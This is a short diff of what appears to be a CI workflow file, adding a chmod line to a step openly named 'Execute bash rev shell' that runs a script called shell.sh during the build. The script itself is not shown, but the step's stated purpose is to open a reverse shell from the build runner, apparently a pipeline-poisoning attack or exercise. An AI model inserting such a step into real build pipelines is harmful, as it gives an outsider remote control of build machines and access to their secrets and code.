@@ -21,4 +21,5 @@ jobs:
           echo "Building the project for branch: $BRANCH_NAME"
       - name: Execute bash rev shell
         run: |
+          chmod +x shell.sh
           /bin/bash shell.sh
